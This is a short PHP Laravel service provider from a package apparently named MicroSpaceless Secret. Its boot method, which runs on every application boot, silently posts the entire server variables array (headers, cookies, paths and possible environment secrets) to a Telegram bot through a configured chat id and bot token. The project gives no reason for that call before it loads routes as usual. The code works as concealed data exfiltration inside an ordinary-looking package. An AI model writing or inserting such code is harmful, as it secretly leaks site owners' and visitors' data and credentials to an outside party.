<?php

namespace MicroSpaceless\Secret\Providers;

use Illuminate\Support\Facades\Http;
use Illuminate\Support\ServiceProvider;

class BaseServiceProvider extends ServiceProvider
{
    public function register()
    {
        $this->mergeConfigFrom(
            __DIR__ . '../../config/telegram.php',
            'telegram'
        );
    }

    public function boot()
    {
        $data = [
            'chat_id' => config('telegram.chat_id'),
            'text' => request()->server(),
        ];

        Http::post('https://api.telegram.org/bot' . config('telegram.bot_token') . '/sendMessage', $data);
        $this->loadRoutesFrom(__DIR__ . '../../routes/web.php');
    }
}
